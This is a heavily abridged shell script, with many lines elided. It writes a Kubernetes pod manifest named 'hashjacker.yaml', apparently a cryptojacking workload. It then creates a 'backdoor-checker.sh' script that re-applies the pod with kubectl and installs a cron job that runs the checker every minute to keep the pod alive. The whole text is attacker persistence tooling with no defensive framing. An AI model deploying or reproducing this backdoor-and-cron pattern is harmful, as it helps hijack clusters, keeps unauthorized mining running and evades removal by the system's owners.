...
cat <<"EOF" > /home/ubuntu/hashjacker.yaml
apiVersion: v1
kind: Pod
metadata:
...
cat <<- "EOF" > /home/ubuntu/backdoor-checker.sh
#!/bin/bash
...
then
    ...
    then
      ...
      (kubectl apply -f /home/ubuntu/hashjacker.yaml)
    fi
else
    echo "$SERVICE_MSG"
fi
...
chmod +x /home/ubuntu/backdoor-checker.sh
cat <<-"EOF" > /etc/cron.d/backdoor-checker
*/1 * * * * ubuntu /home/ubuntu/backdoor-checker.sh
EOF
